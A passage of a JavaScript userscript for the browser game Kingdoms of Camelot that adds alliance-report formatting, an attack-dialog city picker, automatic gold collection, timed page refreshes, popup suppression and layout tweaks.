    t.marvFunc.setEnable (true);
	t.enable_viewmembers(Options.enhanceViewMembers);
  },
   
  getReportDisplayHook : function (a, b){
    var x = '';
    try {
      x = uW.getReportDisplay(a,b);  
    } catch (e){
      x = 'Error formatting report: '+ e;
    }
    return x;
  },
  
  enable_viewmembers : function (tf){
    t = AllianceReports;
    t.memListFunc.setEnable (tf);
  },
  
  enable : function (tf){
    t = AllianceReports;
    if (tf)
      uW.allianceReports = t.myAllianceReports;
    else
      uW.allianceReports = t.saveArfunc;
  },
  
  myAllianceReports : function (pageNum){
    var params = uW.Object.clone(uW.g_ajaxparams);
    if (pageNum)
      params.pageNo = pageNum;
    params.group = "a";
    new MyAjaxRequest(uW.g_ajaxpath + "ajax/listReports.php" + uW.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
//logit (inspect (rslt, 1, 1));        
        displayReports (rslt.arReports, rslt.arPlayerNames, rslt.arAllianceNames, rslt.arCityNames, rslt.totalPages);
      },
      onFailure: function (rslt) {
      },
    }, false);

    function displayReports (ar, playerNames, allianceNames, cityNames, totalPages){
      var msg = new Array();
      var myAllianceId = getMyAlliance()[0];
      msg.push ("<STYLE>.msgviewtable tbody .myCol div {margin-left:5px; overflow:hidden; white-space:nowrap; color:#000;}\
            .msgviewtable tbody .myHostile div {font-weight:600; color:#600}\
            .msgviewtable tbody .myGray div {color:#666}\
            .msgviewtable tbody .myRein div {color:#050}\
            .msgviewtable tbody .myWarn div {font-weight:600; color:#442200}\
            </style>");
      msg.push("<div class='modal_msg_reports'>");
      var rptkeys = uW.Object.keys(ar);
      if (matTypeof(ar) != 'array') {
//logit ('displayReports: '+ Options.allowAlterAR);        
        if (Options.allowAlterAR)
          msg.push("<div id='modal_alliance_reports_tablediv' class='modal_msg_list'><table width=675 cellpadding='0' cellspacing='0' class='msgviewtable reportviewtable alliancetable'>");
        else
          msg.push("<div id='modal_alliance_reports_tabledivNKA' class='modal_msg_list'><table width=675 cellpadding='0' cellspacing='0' class='msgviewtable reportviewtable alliancetable'>");
        msg.push("<thead><tr><td width=105>"+culang.udate+"</td><td width=40>"+culang.type+"</td><td width=150>"+culang.victim+"</td><td>"+culang.target+"</td><td>"+culang.show+"</td></tr></thead><tbody>");
        for (var i = 0; i < rptkeys.length; i++) {
          var rpt = ar[rptkeys[i]];
          var colClass = '"myCol"';
          rpt.marchType = parseInt(rpt.marchType);
          rpt.side0AllianceId = parseInt(rpt.side0AllianceId);
          var targetDiplomacy = getDiplomacy (rpt.side0AllianceId);
          if (rpt.marchType == 2){
            colClass = '"myCol myRein"';
          } else if (rpt.side1AllianceId != myAllianceId){
            colClass = '"myCol myHostile"';
          } else {
            if (parseInt(rpt.side0TileType) < 50){          // if wild
              if (parseInt(rpt.side0PlayerId) == 0)
                colClass = '"myCol myGray"';
              else
                colClass = '"myCol myWarn"';
            } else if (parseInt(rpt.side0PlayerId) == 0) {   // barb
              colClass = '"myCol myGray"';
            } else {
              if (targetDiplomacy == 'friendly')
                colClass = '"myCol myWarn"';
            }
          }
//logit (inspect (ar, 3, 1));
          msg.push ('<tr valign=top');
          if (i%2 == 0)
            msg.push(" class=stripe");
          msg.push("><TD class="+ colClass +"><div>");
          msg.push(uW.formatDateByUnixTime(rpt.reportUnixTime));
		  msg.push ('<BR>'+culang.shrreport+': ');
          msg.push (rpt.reportId);          
          msg.push("</div></td><TD class="+ colClass  +"><div>");
          if (rpt.marchType == 1)
            msg.push (uW.g_js_strings.commonstr.transport);
          else if (rpt.marchType == 3)
            msg.push (uW.g_js_strings.commonstr.scout);
          else if (rpt.marchType == 2)
            msg.push (''+culang.rptreinforce+'');
          else
            msg.push (uW.g_js_strings.commonstr.attack);

          // attacker ...
          msg.push ("</div></td><TD class="+ colClass +"><div>");
          if (parseInt(rpt.side1PlayerId) != 0)
            msg.push(escape(playerNames["p" + rpt.side1PlayerId]))
          else
            msg.push ('?'+culang.botStatUnknown+'?');
            msg.push (' ');
            msg.push (pdxkoordlink(rpt.side1XCoord, rpt.side1YCoord));
            msg.push ('<BR>');
          
          if (rpt.side1AllianceId != myAllianceId){
            msg.push (allianceNames['a'+rpt.side1AllianceId]);
            msg.push (' (');
            msg.push (getDiplomacy(rpt.side1AllianceId));
            msg.push (')');
          } else {
            msg.push ('<BR>');
          }
          msg.push ('</div></td>');

          // target ...
          msg.push ("<TD class="+ colClass  +"><DIV>");
          var type = parseInt(rpt.side0TileType);

          if (type < 50){                              // wild
            msg.push(uW.g_mapObject.types[type].toString().capitalize());
            msg.push(" "+culang.lvl+" " + rpt.side0TileLevel)
            if (parseInt(rpt.side0PlayerId) != 0) {   // IF OWNED, show owner ...
              msg.push (' [');
              msg.push (escape(playerNames["p" + rpt.side0PlayerId]));
              msg.push ('] ');
            }
          } else {
            if (parseInt(rpt.side0PlayerId) == 0) {   //  barb
              msg.push(uW.g_js_strings.commonstr.barbariancamp);
              msg.push(" "+culang.lvl+" " + rpt.side0TileLevel)
            } else {        // city
              msg.push (escape(playerNames["p" + rpt.side0PlayerId]));
              msg.push (' - ');
              msg.push (cityNames['c'+ rpt.side0CityId]);
            }
          }
          msg.push (' ');
          msg.push (pdxkoordlink(rpt.side0XCoord, rpt.side0YCoord));
          if (rpt.side0AllianceId!=0 && rpt.side0AllianceId!=myAllianceId){
            msg.push ('<BR>');
            msg.push (allianceNames['a'+rpt.side0AllianceId]);
            msg.push (' (');
            msg.push (targetDiplomacy);
            msg.push (')');
          }
       
          // 'view report' link ...
          if (Options.allowAlterAR)
            msg.push("</div></td><TD class="+ colClass  +"><div><a onclick=' modal_alliance_report_view(\"");   // ONCLICK ???
          else
            msg.push("</div></td><TD class="+ colClass  +"><div><a onclick=' $(\"modal_alliance_reports_tabledivNKA\").id=\"modal_alliance_reports_tablediv\"; modal_alliance_report_view(\"");   // ONCLICK ???
          msg.push(rpt.reportId);
          msg.push('",');
          if (parseInt(rpt.side1AllianceId) == parseInt(Seed.allianceDiplomacies.allianceId))
            msg.push(1);
          else
            msg.push(0);
          msg.push(",");
          msg.push(rpt.side0TileType);
          msg.push(",");
          msg.push(rpt.side0TileLevel);
          msg.push(",");
          msg.push(rpt.side0PlayerId);
          msg.push(',"');
          if (parseInt(rpt.side0PlayerId) != 0)
            msg.push(escape(playerNames["p" + rpt.side0PlayerId]));
          else
            msg.push(uW.g_js_strings.commonstr.enemy);
          msg.push('","');
          if (parseInt(rpt.side0PlayerId) != 0)
            msg.push(escape(playerNames["g" + rpt.side0PlayerId]));
          else
            msg.push(0)
          msg.push('","');
          if (parseInt(rpt.side1PlayerId) > 0)
            msg.push(escape(playerNames["p" + rpt.side1PlayerId]));
          msg.push('","');
          if (parseInt(rpt.side1PlayerId) != 0)
            msg.push(escape(playerNames["g" + rpt.side1PlayerId]));
          msg.push('",');
          msg.push(rpt.marchType);
          msg.push(",");
          msg.push(rpt.side0XCoord);
          msg.push(",");
          msg.push(rpt.side0YCoord);
          msg.push(",");
          msg.push(rpt.reportUnixTime);
          msg.push(",");
          if (parseInt(rpt.reportStatus) == 2)
            msg.push(1);
          else
            msg.push(0);
          if (rpt.side1XCoord) {
            msg.push(",");
            msg.push(rpt.side1XCoord);
            msg.push(",");
            msg.push(rpt.side1YCoord)
          } else {
            msg.push(",,");
          }
          msg.push(");return false;'><img alt='"+culang.show+"' border=0 src='http://koc-power-pdx.googlecode.com/svn/trunk/img/search_button.png' title='"+culang.showrpt+"';></a></div></td></tr>");
        }
        msg.push("</tbody></table></div>");
      }
      msg.push("</div><div id='modal_report_list_pagination'></div>");
      document.getElementById('allianceContent').innerHTML = msg.join("");
      if (pageNum) {
        uW.ctrlPagination("modal_report_list_pagination", totalPages, "allianceReports", pageNum)
      } else {
        uW.ctrlPagination("modal_report_list_pagination", totalPages, "allianceReports")
      }
    }
  },

}   // end AllianceReports singleton

var AttackDialog = {
  init : function (){
    var t = AttackDialog;
    t.modal_attackFunc = new CalterUwFunc ('modal_attack', [[/}\s*$/, 'attackDialog_hook(); }']]);
    unsafeWindow.attackDialog_hook = t.modalAttackHook;
    t.modal_attackFunc.setEnable (true);
  },

  setEnable : function (){
  },

  isKnightSelectAvailable : function (){
    var t = AttackDialog;
    return t.modal_attackFunc.isAvailable();
  },
  isAttackCityPickerAvailable : function (){
    var t = AttackDialog;
    return t.modal_attackFunc.isAvailable();
  },

  modalAttackHook : function (){
    var t = AttackDialog;
    if (Options.fixKnightSelect || Options.attackCityPicker){
      for (var i=1; i<6; i++)
        document.getElementById('modal_attack_tab_'+ i).addEventListener('click', t.e_changeMarchType, false);
    }
    if (Options.attackCityPicker){
      setTimeout (t.initCityPicker, 0);
    }
  },

  initCityPicker : function (){
    var t = AttackDialog;
    var div = document.getElementById('modal_attack_target_numflag'); // as of KofC version 96;
    var mySpan;
    if (div) {
      div.parentNode.innerHTML += ' &nbsp; <SPAN id=modal_attack_citybuts></span>';
    } else {
      var span = document.getElementById('modal_attack_target_coords');   // KofC version 116+;
      span.parentNode.parentNode.firstChild.innerHTML += ' &nbsp; <SPAN id=modal_attack_citybuts></span>';
    }
    new CdispCityPicker ('ptatp', document.getElementById('modal_attack_citybuts'), false, t.e_CityButton);
    var cityIdx = Cities.byID[unsafeWindow.currentcityid].idx;
    thisCityBut = document.getElementById('ptatp_'+ cityIdx);
    thisCityBut.style.opacity = '0.5';
    thisCityBut.disabled = true;
    if (document.getElementById('modal_attack_tab_4').className=='selected' || document.getElementById('modal_attack_tab_3').className=='selected')   // don't do for attack or scout
      document.getElementById('modal_attack_citybuts').style.display = 'none';
  },

  e_CityButton : function (city){
    document.getElementById('modal_attack_target_coords_x').value = city.x;
    document.getElementById('modal_attack_target_coords_y').value = city.y;
    unsafeWindow.modal_attack_update_time();
  },

  e_changeMarchType : function (evt){
    var t = AttackDialog;
    var marchType = parseInt(evt.target.id.substr(17));
    if (Options.attackCityPicker){
      if (marchType==3 || marchType==4)
        document.getElementById('modal_attack_citybuts').style.display = 'none';
      else
        document.getElementById('modal_attack_citybuts').style.display = 'inline';
    }
    if (Options.fixKnightSelect){
      var knightVal = 0;
      var selector = document.getElementById('modal_attack_knight');
      if (selector.length>1 && (marchType==4 || marchType==2))   // if 'attack' or 'reinforce'
        knightVal = 1;
      selector.selectedIndex = knightVal;
    }
  },
}
/************************ Gold Collector ************************/
var CollectGold = {
  timer : null,
  lastCollect : {},

  init : function (){
    var t = CollectGold;
    for (var c=0; c<Cities.numCities; c++)
      t.lastCollect['c'+ Cities.cities[c].id] = 0;
    if (Options.pbGoldEnable)
      t.setEnable (true);
  },

  setEnable : function (tf){
    var t = CollectGold;
    clearTimeout (t.timer);
    if (tf)
      t.tick();
  },

  colCityName : null,
  colHappy : 0,
  tick : function (){
    var t = CollectGold;
    for (var c=0; c<Cities.numCities; c++){
      var city = Cities.cities[c];
      var happy = Seed.citystats['city'+ city.id].pop[2];
      var since = unixTime() - t.lastCollect['c'+city.id];
      if (happy>=Options.pbGoldHappy && since>15*60){
        t.lastCollect['c'+city.id] = unixTime();
        t.colCityName = city.name;
        t.colHappy = happy;
        t.ajaxCollectGold (city, t.e_ajaxDone);
        break;
      }
    }
    t.timer = setTimeout (t.tick, 15000);
  },

  e_ajaxDone : function (rslt){
    var t = CollectGold;
    if (rslt.ok)
      actionLog ('<b>'+culang.auto+' '+culang.gold+'</b>  '+ rslt.goldGained +' '+culang.actionGold3col+' '+ t.colCityName +' ('+culang.actionGoldwashappy+' '+ t.colHappy +'%)');
    else
      actionLog ('<b>'+culang.auto+' '+culang.gold+'</b> '+culang.actionGold3col+' '+ t.colCityName +': <SPAN class=boldRed>'+ rslt.errorMsg +'</span>');
  },

  ajaxCollectGold : function (city, notify){
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.cid = city.id;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/levyGold.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        if (notify)
          notify (rslt);
      },
      onFailure: function (rslt) {
        if (notify)
          notify (rslt);
      }
    });
  },
}
/************************ Refresh Every X minutes ************************/
var RefreshEvery  = {
  timer : null,
  PaintTimer : null,
  NextRefresh : 0,
  box : null,
  target : null,

  init : function (){
    var t = RefreshEvery;
	t.creatediv();
	if (Options.pbEveryMins < 1)
        Options.pbEveryMins = 1;
    RefreshEvery.setEnable (Options.pbEveryEnable);
  },
  
  creatediv : function(){
    var t = RefreshEvery;
	t.target = document.getElementById('comm_tabs');
	if(t.target == null){
		setTimeout(t.creatediv, 2000);
		return;
	}
	t.box = document.createElement('div');
	t.target.appendChild(t.box);
	t.box.id = "pdxQuickInfos";
	t.box.setAttribute("style", pdxQuickInfos);
  },
  
  setEnable : function (tf){
    var t = RefreshEvery;
    clearTimeout (t.timer);
    if (tf) {
      t.timer = setTimeout (t.doit, Options.pbEveryMins*60000);
      t.NextRefresh = unixTime() + (Options.pbEveryMins*60); 
      t.PaintTimer = setTimeout (t.Paint, 5000);

    } else {
        t.PaintTimer = null;
		t.timer = null;
		t.NextRefresh = 0;
		if (Options.pbChatOnRight==true) t.box.innerHTML = '<center><B>&nbsp;&nbsp;&nbsp;&nbsp;'+ getMyAlliance()[1] + ' (<span class=pdxQuickInfoData>' + getServerId() +'</span>)</b></center>';
		if (Options.pbChatOnRight==false) t.box.innerHTML = '<B>&nbsp;&nbsp;&nbsp;&nbsp;'+ getMyAlliance()[1] + ' (<span class=pdxQuickInfoData>' + getServerId() +'</span>)</b>';
t.box.setAttribute("style", pdxQuickInfos);
		}
  },
  
  doit : function (){
    actionLog ('<b>'+culang.arefresh+'</b> ('+ Options.pbEveryMins +' '+culang.actionAutoRefresh +')');
    reloadKOC();
  },
  
  setTimer : function (){
    var t = RefreshEvery;
    clearTimeout (t.timer);
    if (Options.pbEveryMins < 1) Options.pbEveryMins = 1;
    RefreshEvery.setEnable (Options.pbEveryEnable);
  },
  
  Paint : function(){
     var t = RefreshEvery;
	 if(t.timer == null) return;
     now = unixTime();
	 if (Options.pbChatOnRight==false) var text = '<B>&nbsp;&nbsp;&nbsp;&nbsp;'+ getMyAlliance()[1] + ' (<span class=pdxQuickInfoData>' + getServerId() +'</span>)</b>';	
	 if (Options.pbChatOnRight==true) var text = '<B>&nbsp;&nbsp;&nbsp;&nbsp;'+ getMyAlliance()[1] + ' (<span class=pdxQuickInfoData>' + getServerId() +'</span>)</b>';	 
     var Left = (t.NextRefresh - now);
     if ( Left < 0) Left = 0;
     if ( Left < 60) text += ' <b>- '+culang.Refreshin+'</b>: <span class=pdxQuickInfoData>'+ timestr(Left) +'</span></div>';
     else text += ' <b>- '+culang.Refreshin+'</b>: <span class=pdxQuickInfoData>'+ timestr(Left) +'</span></div>';
     t.box.innerHTML = text;
	 t.box.setAttribute("style", pdxQuickInfos);
     t.PaintTimer = setTimeout (t.Paint, 1000);
  },
}
if (Options.pbChatOnRight==false) { var pdxQuickInfos = "color:#141516; font-variant:small-caps; background-image:none;"; }
if (Options.pdxBackgroundStyle=="pdxBackground11" && Options.pbChatOnRight==true) {	var pdxQuickInfos = "color:#FFF; font-variant:small-caps; background-image:url("+Options.devBG+"); -moz-border-radius:3px; border:1px solid #141516; -moz-box-shadow: 0 0 3px 3px #FFF; width:360px; ";}

if (Options.pbChatOnRight==true) { var pdxQuickInfos = "color:"+Colors.pdxQuickInfoFont+"; font-variant:small-caps; background-image:url("+Options.pdxQuickInfoBG+");  -moz-border-radius:3px; border:1px solid #141516; -moz-box-shadow: 0 0 3px 3px #FFF; width:360px; "; }

if (Options.pbChatOnRight==true && Options.pdxBackgroundStyle=="pdxBackgroundColor" || Options.pdxBackgroundStyle=="pdxOwnBackground") { var pdxQuickInfos = "font-variant:small-caps; background-image:url("+Options.pdxQuickInfoBG+");  -moz-border-radius:3px;  -moz-box-shadow: 0px 0px 3px 3px #141516; color: #FFF; width:360px;"; }
//if (Options.pbChatOnRight==false &&  Options.pdxBackgroundStyle=="pdxBackgroundColor" || Options.pdxBackgroundStyle=="pdxOwnBackground"  ) { var pdxQuickInfos = "font-variant:small-caps; background-image:none; border:none; color: #141516; "; }

if (Options.pbChatOnRight==true && Options.pdxBackgroundStyle=="pdxOwnBackgrounddark" || Options.pdxBackgroundStyle=="pdxBackgroundColordark"  ) { var pdxQuickInfos = "font-variant:small-caps; background-image:url("+Options.pdxQuickInfoBG+");  -moz-border-radius:3px;  -moz-box-shadow: 0 0 3px 3px #FFF; color: #FFF; width:360px; "; }
//if (Options.pbChatOnRight==false && Options.pdxBackgroundStyle=="pdxOwnBackgrounddark" || Options.pdxBackgroundStyle=="pdxBackgroundColordark"  )  { var pdxQuickInfos = "font-variant:small-caps; background-image:none; border:none; color: #141516;  "; }

if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true) { var pdxQuickInfos = "font-variant:small-caps; background-image:url("+Options.pdxQuickInfoBG+"); -moz-border-radius:3px;  -moz-box-shadow: 0 0 3px 3px #141516; color: #FFF; width:360px; "; }
/************************ Fairie Killer ************************/
var FairieKiller  = {
  saveFunc : null,
  init : function (tf){
    if (firefoxVersion.substring(0,4) == '4.0b')  // bug in firefox 4.0b10 causes syntax error with: "var func = eval ('function (){}');"
      return;
    FairieKiller.saveFunc = unsafeWindow.Modal.showModalUEP;
    FairieKiller.setEnable (tf);
  },
  setEnable : function (tf){
    if (tf)
	  unsafeWindow.Modal.showModalUEP = eval ('function FairieKiller (a,b,c) {actionLog ("<b>'+culang.actioPopup+'</b>'+culang.actioPopup2+'");}');
    else
      unsafeWindow.Modal.showModalUEP = FairieKiller.saveFunc;
  },
}
/********** facebook watchdog: runs only in 'http://apps.facebook.com/kingdomsofcamelot/*' instance!  ******/
function facebookWatchdog (){
  var INTERVAL = 50000; // wait 50 seconds minute before checking DOM
  if (!GlobalOptions.pbWatchdog)
    return;
  setTimeout (watchdog, INTERVAL);

  function watchdog (){
    try {
      if (document.getElementById('app_content_130402594779') == null){
        logit ("KOC NOT FOUND!");
        KOCnotFound(5*60);
      }
    } catch (e){
      logit ("KOC NOT FOUND!");
      KOCnotFound(4*60);
    }
  }
}

function kocWatchdog (){
  var INTERVAL = 10000; // wait 30 seconds before checking DOM
  if (!GlobalOptions.pbWatchdog)
    return;
  setTimeout (watchdog, INTERVAL);
  function watchdog (){
logit ("KOC WATCHDOG: "+ document.getElementById('mod_maparea'));
    if (document.getElementById('mod_maparea')==null){
      logit ("KOC not loaded");
      KOCnotFound(20);
    }
  }
}

function KOCnotFound(secs){
  var div;
  var countdownTimer = null;
  var endSecs = (new Date().getTime()/1000) + secs;

  div = document.createElement('div');
  div.innerHTML = '<DIV style="font-size:18px; background-color:#a00; color:#fff"><CENTER><BR> '+culang.kocpwrErr+'<BR>\
      Refreshing in <SPAN id=pbwdsecs></span><BR><INPUT id=pbwdcan type=submit value="'+culang.cancel+' '+culang.refresh+'"><BR><BR></div>';
  document.body.insertBefore (div, document.body.firstChild);
  document.getElementById('pbwdcan').addEventListener('click', cancel, false);
  countdown();

  function countdown (){
    var secsLeft = endSecs - (new Date().getTime()/1000);
    document.getElementById('pbwdsecs').innerHTML = timestr(secsLeft);
    if (secsLeft < 0)
    reloadKOC();
    countdownTimer = setTimeout (countdown, 1000);
  }
  function cancel (){
    clearTimeout (countdownTimer);
    document.body.removeChild (div);
  }
}

var WideScreen = {
  chatIsRight : false,
  useWideMap : false,
  rail : null,

  init : function (){
    t = WideScreen;
    if (GlobalOptions.pbWideScreen){
      t.rail = searchDOM (document.getElementById('mod_maparea'), 'node.className=="maparea_rrail"', 10);
      GM_addStyle ('.modalCurtain {width:760px !important} .mod_comm_mmb{z-index:0 !important;}');
      try {

        document.getElementById('progressBar').parentNode.removeChild(document.getElementById('progressBar'));
        document.getElementById('crossPromoBarContainer').parentNode.removeChild(document.getElementById('crossPromoBarContainer'));
      } catch (e) {
      }
    }
  },

  setChatOnRight : function (tf){
    t = WideScreen;
    if (tf == t.chatIsRight || !GlobalOptions.pbWideScreen)
      return;
    if (tf){
      var chat = document.getElementById('kocmain_bottom').childNodes[1];
      if (!chat || chat.className!='mod_comm')
        setTimeout (function (){t.setChatOnRight(tf)}, 1000);

	  if (Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" ||	Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" || Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" || Options.pdxBackgroundStyle=="pdxBackground40" || Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" || Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" || Options.pdxBackgroundStyle=="pdxBackground60" || Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64" ||
	  Options.pdxBackgroundStyle=="pdxKoCOld"  || Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackgroundColordark" || Options.pdxBackgroundStyle=="pdxBackgroundColor" || Options.pdxBackgroundStyle=="pdxOwnBackground" || Options.pdxBackgroundStyle=="pdxOwnBackgrounddark" || Options.pdxBackgroundStyle=="pdxBackground11" && Options.pbChatOnRight==true) {
	  chat.style.top = '-555px';
	  chat.style.left = '755px';

	  document.getElementById('mod_comm_list1').style.height = '800px';
      document.getElementById('mod_comm_list2').style.height = '800px';	  
	  document.getElementById('mod_comm_list1').style.width = Options.chatWidth+'px';
      document.getElementById('mod_comm_list2').style.width = Options.chatWidth+'px';
	  }
	  if (Options.pbChatOnRight==true && Options.pdxBackgroundStyle=="pdxBackground11" && Options.hideShowKoCBottomStuff==true) {
	  chat.style.top = Options.chatTop;
	  chat.style.left = Options.chatLeft;

	  document.getElementById('mod_comm_list1').style.height = '505px';
      document.getElementById('mod_comm_list2').style.height = '505px';
	  	  document.getElementById('mod_comm_list1').style.width = Options.chatWidth+'px';
      document.getElementById('mod_comm_list2').style.width = Options.chatWidth+'px';
	  }
 } else {
      var chat = document.getElementById('kocmain_bottom').childNodes[1];
      chat.style.top = '0px';
      chat.style.left = '0px';
      chat.style.height = '';
      chat.style.background = '';
      document.getElementById('mod_comm_list1').style.height = '287px';
      document.getElementById('mod_comm_list2').style.height = '287px';
	  document.getElementById('mod_comm_list1').style.width = '290px';
      document.getElementById('mod_comm_list2').style.width = '290px';
    }
    t.chatIsRight = tf;
  },

  useWideMap : function (tf) {
    t = WideScreen;
    if (tf == t.useWideMap || !GlobalOptions.pbWideScreen)
      return;
    if (tf){
      t.rail.style.display = 'none';
      document.getElementById('mapwindow').style.height = "436px";
      document.getElementById('mapwindow').style.width = Options.widewidth;
      document.getElementById('mapwindow').style.zIndex = "50";
    } else {
      t.rail.style.display = 'block';
      document.getElementById('mapwindow').style.height = "439px";
      document.getElementById('mapwindow').style.width = "760px";
      document.getElementById('mapwindow').style.zIndex = "";
    }
  },
}
/**********************************************************************************/
/************ KOC POWER - TAB MANAGER ********************************************/
/********************************************************************************/
var tabManager = {
  tabList : {},
  currentTab : null,
  
  init : function (mainDiv){
    var t = tabManager;
    var sorter = [];
    for (k in Tabs){
      if (!Tabs[k].tabDisabled){  
        t.tabList[k] = {};
        t.tabList[k].name = k;
        t.tabList[k].obj = Tabs[k];
        if (Tabs[k].tabLabel != null)
          t.tabList[k].label = Tabs[k].tabLabel;
        else
          t.tabList[k].label = k;
        if (Tabs[k].tabOrder != null)
          sorter.push([Tabs[k].tabOrder, t.tabList[k]]);
        else
          sorter.push([1000, t.tabList[k]]);
        t.tabList[k].div = document.createElement('div');
      }
    }
	
    sorter.sort (function (a,b){return a[0]-b[0]});
    var m = '<div class=pdxMenu><TABLE cellspacing=0 class=pbMainTab><TR>';
	m += '<div class=pdxDisableMenu><input src="http://koc-power-pdx.googlecode.com/svn/trunk/img/minusMenu.png" title="'+culang.hideMenuBar+'" alt="'+culang.buttonoff+'" type="image" value="'+culang.buttonoff+'" onclick="if(document.getElementById(\'pb_top\').style.display=\'block\'){document.getElementById(\'pb_top\').style.display=\'none\'}else{document.getElementById(\'pb_top\').style.display=\'block\'}"></div>';
    for (var i=0; i<sorter.length; i++){
     m += '<TD align=left class=notSel id=pbtc'+ sorter[i][1].name +'><A><SPAN>'+ sorter[i][1].label +'</span></a></td></tr><TR>';
	}
    m+='</tr></table></div>';
    mainPop.getMainTopDiv().innerHTML = m;
    
    for (k in t.tabList) {
      if (t.tabList[k].name == Options.currentTab)
        t.currentTab =t.tabList[k] ;
      document.getElementById('pbtc'+ k).addEventListener('click', this.e_clickedTab, false);
      var div = t.tabList[k].div;
      div.style.display = 'none';
      div.style.height = '100%';
      mainDiv.appendChild(div);
      try {
        t.tabList[k].obj.init(div);
      } catch (e){
        div.innerHTML = "INIT "+culang.Herror+": "+ e;
      }
    }
    
    if (t.currentTab == null)
      t.currentTab = sorter[0][1];    
    t.setTabStyle (document.getElementById ('pbtc'+ t.currentTab.name), true);
    t.currentTab.div.style.display = 'block';
  },
  
  hideTab : function (){
    var t = tabManager;
    t.currentTab.obj.hide();
  },
  
  showTab : function (){
    var t = tabManager;
    t.currentTab.obj.show();
  },
    
  setTabStyle : function (e, selected){
    if (selected){
      e.className = 'sel';
    } else {
      e.className = 'notSel';
    }
  },
  e_clickedTab : function (e){
    var t = tabManager;
    newTab = t.tabList[e.target.parentNode.parentNode.id.substring(4)];
    if (t.currentTab.name != newTab.name){
      t.setTabStyle (document.getElementById ('pbtc'+ t.currentTab.name), false);
      t.setTabStyle (document.getElementById ('pbtc'+ newTab.name), true);
      t.currentTab.obj.hide ();
      t.currentTab.div.style.display = 'none';
      t.currentTab = newTab;
      newTab.div.style.display = 'block';
      Options.currentTab = newTab.name;      
    }
    newTab.obj.show();
  },
}
function AjaxRequest2 (url, opts){
    var headers = {
        'X-Requested-With': 'XMLHttpRequest',
        'X-Prototype-Version': '1.6.1',
        'Accept': 'text/javascript, text/html, application/xml, text/xml, */*'
    };
    var ajax = null;   
    if (window.XMLHttpRequest)
      ajax=new XMLHttpRequest();
    else
      ajax=new ActiveXObject("Microsoft.XMLHTTP");   
    if (opts.method==null || opts.method=='')
      method = 'GET';
    else
      method = opts.method.toUpperCase();    
    if (method == 'POST'){
        headers['Content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8';
    } else if (method == 'GET'){
        addUrlArgs (url, opts.parameters);
    }    
    ajax.onreadystatechange = function(){ // ['Uninitialized', 'Loading', 'Loaded', 'Interactive', 'Complete']; states 0-4
        if (ajax.readyState==4) {
            if (ajax.status >= 200 && ajax.status < 305)
            if (opts.onSuccess) opts.onSuccess(ajax);
            else
                if (opts.onFailure) opts.onFailure(ajax);
            } else {
                if (opts.onChange) opts.onChange (ajax);
            }
    }    
    ajax.open(method, url, true); // always async!
    for (var k in headers)
      ajax.setRequestHeader (k, headers[k]);
     if (matTypeof(opts.requestHeaders)=='object')
          for (var k in opts.requestHeaders)
            ajax.setRequestHeader (k, opts.requestHeaders[k]);
    if (method == 'POST'){
        var a = [];
        for (k in opts.parameters){
